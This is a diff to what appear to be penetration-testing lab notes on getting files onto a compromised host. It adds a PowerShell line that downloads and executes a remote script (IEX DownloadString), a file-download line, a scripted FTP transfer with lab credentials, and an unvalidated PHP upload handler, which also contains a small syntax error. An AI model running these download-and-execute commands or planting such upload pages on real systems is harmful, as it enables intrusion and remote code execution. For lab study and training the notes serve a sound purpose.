@@ -31,15 +31,28 @@
             stty rows 50 columns 120
             reset 
     # win7 and later win, powershell download file
-        powershell.sex (New-ObjectSystem.Net.WebClient).DownloadFile('http://IP/xxx','newname.xx')
+        powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://IP/xxx','newname.xx')
+
+        powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://IP/xxx.ps1')
  
      # non-interactive situation
         echo open IP > ftp.txt
         echo USER offsec >> ftp.txt
-        echo lab >> ftp.txt
-        echo bin >> ftp.txt
+        echo lab >> ftp.txt #(the password)
+        echo bin >> ftp.txt #(onlyif the file is  .exe is needed)
         echo bin >> ftp.txt
         echo GET xx(file name) >> ftp.txt
         echo bye >> ftp.txt
         # then on the source host,,  
             ftp -v -n -s:ftp.txt  #-s set the file to run
+
+    # php upload page file
+<?php
+$uploaddir = '/var/www/uploads/';
+$uploadfile = uploaddir.$_FILES['file']['name'];
+move_uploaded_file($_FILES['file']['tmp_name'],$uploadfile);
+?>
+
+            # ss -pantu  /* to check the socket port
+
+
